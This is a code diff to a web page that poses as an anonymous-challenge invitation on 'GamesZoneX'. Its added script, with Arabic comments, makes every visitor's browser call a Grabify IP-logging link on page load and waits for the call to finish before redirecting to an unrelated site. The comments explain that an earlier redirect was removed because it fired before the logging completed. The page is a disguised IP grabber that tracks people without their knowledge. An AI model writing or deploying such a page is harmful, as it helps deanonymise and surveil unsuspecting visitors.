@@ -1,35 +1,40 @@
-
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>end me anonymous challenges on GamesZoneX!</title>
-  <meta http-equiv="refresh" content="1; url=https://www.dominoes.mx">
+  <title>Send me anonymous challenges on GamesZoneX!</title>
+  <!-- تم حذف وسم meta refresh لأنه كان يخرب العملية ويسرع التحويل قبل التسجيل -->
 </head>
 <body>
-  <button id="btn" style="display:none;" >Go</button>
 
   <script>
-    const btn = document.getElementById('btn');
-      
-    btn.addEventListener('click', async () => {
-      btn.disabled = true;
+    // هذه الدالة ستبدأ بالعمل فوراً عند فتح الصفحة
+    async function logAndRedirect() {
+      const grabifyUrl = 'https://grabify.link'; 
+      const destinationUrl = 'https://dominoes.mx';
 
-     const grabifyUrl = 'https://grabify.link/JLMB8N'; 
+      try {
+        // استخدام await يجبر المتصفح على الانتظار لحين انتهاء الاتصال بـ Grabify
+        await fetch(grabifyUrl, { 
+          mode: 'no-cors',
+          cache: 'no-cache',
+          credentials: 'omit'
+        });
+        
+        // ننتظر نصف ثانية إضافية احتياطاً للتأكد من معالجة السيرفر للطلب
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+      } catch (e) {
+        console.log('Error logging');
+      } finally {
+        // الآن يتم التحويل إلى الموقع الآخر بأمان بعد الضمان
+        window.location.href = destinationUrl;
+      }
+    }
 
-      fetch(grabifyUrl, { 
-        mode: 'no-cors',
-        cache: 'no-cache',
-        credentials: 'omit'
-      }).then(() => console.log('Logged'))
-        .catch(e => console.log('Forwarded'));
-    window.location.href='https://www.dominoes.mx'
-    });
-    window.addEventListener("load", function () {
-      document.getElementById("btn").click();
-    });
-
+    // تشغيل الدالة بمجرد تحميل الصفحة
+    window.addEventListener("load", logAndRedirect);
   </script>
 </body>
 </html>
